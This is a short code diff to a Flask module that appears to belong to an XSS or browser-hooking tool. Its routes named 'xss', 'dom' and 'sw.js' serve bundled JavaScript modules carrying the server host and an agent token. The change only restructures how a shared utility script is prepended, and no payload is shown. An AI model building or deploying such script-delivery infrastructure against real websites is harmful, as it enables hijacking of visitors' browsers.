@@ -13,8 +13,9 @@ def apply_cors(response):
 @modules.route('/sw.js')
 def sw():
     vapidPub = os.popen("vapid --applicationServerKey | cut -d' ' -f5").read().strip()
-    return render_template('sw.js', host = request.host, vapidPub = vapidPub, agent_token = Config.AGENT_TOKEN), \
-                          {'Content-Type': 'application/javascript'}
+    res = render_template('sw.js', vapidPub = vapidPub)
+    res += render_template('utils.js', host = request.host, agent_token = Config.AGENT_TOKEN)
+    return res, {'Content-Type': 'application/javascript'}
 
 @modules.route('/xss')
 def xss():
@@ -25,12 +26,12 @@ def xss():
 
 @modules.route('/dom')
 def dom():
-    res = ""
+    res = render_template('utils.js', host = request.host, agent_token = Config.AGENT_TOKEN)
     files = os.listdir('app/templates/dom_modules')
     for name in files:
         res += render_template('dom_modules/' + name)
+        res += "; "
     return res, {'Content-Type': 'application/javascript'}
-
     
 @modules.route('/<name>')
 def moduleName(name):
